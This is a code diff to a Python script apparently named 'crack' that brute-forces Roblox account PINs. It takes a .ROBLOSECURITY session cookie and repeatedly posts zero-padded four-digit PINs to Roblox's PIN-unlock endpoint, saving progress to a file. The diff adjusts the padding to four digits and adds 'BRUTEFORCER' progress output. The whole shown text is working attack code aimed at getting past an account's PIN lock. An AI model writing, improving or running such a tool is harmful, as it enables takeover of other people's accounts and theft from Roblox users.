@@ -147,8 +147,6 @@ class crack:
     cookies = {
     '.ROBLOSECURITY': cookie
     }
-    if isinstance(startingNumber, int) and not startingNumber:
-        startingNumber = int(startingNumber)+1
     v = str(startingNumber)
     while True:
       headers = {
@@ -168,9 +166,13 @@ class crack:
         else:
             os.system("clear")
         crack.check()
-      for _ in range(5-len(str(v))):
+      for _ in range(4-len(str(v))):
         v = f'0{v}'
       pin = v
+      print("[", end="")
+      cprint(" BRUTEFORCER ", "green", end="")
+      print("] " , end="")
+      cprint(f"Trying {pin}...", "red")
       open("currentNumber.txt", "w+").write(str(int(v)))
       response = requests.post("https://auth.roblox.com/v1/account/pin/unlock", headers=headers, data={'pin': pin}, cookies=cookies).json()
       try:
